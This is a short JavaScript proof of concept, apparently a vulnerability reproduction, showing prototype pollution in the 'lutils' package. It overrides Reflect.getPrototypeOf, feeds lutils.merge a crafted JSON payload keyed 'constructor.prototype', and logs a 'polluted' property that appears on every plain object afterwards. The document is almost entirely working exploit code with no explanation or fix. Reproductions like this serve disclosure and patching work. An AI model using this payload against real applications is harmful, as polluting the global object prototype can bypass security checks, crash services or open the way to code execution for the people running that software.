Reflect.getPrototypeOf = () => false;
const lt = require('lutils');
let obj = {};
console.log({}.polluted);
let EVIL_JSON = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
lt.merge({}, EVIL_JSON);
console.log({}.polluted);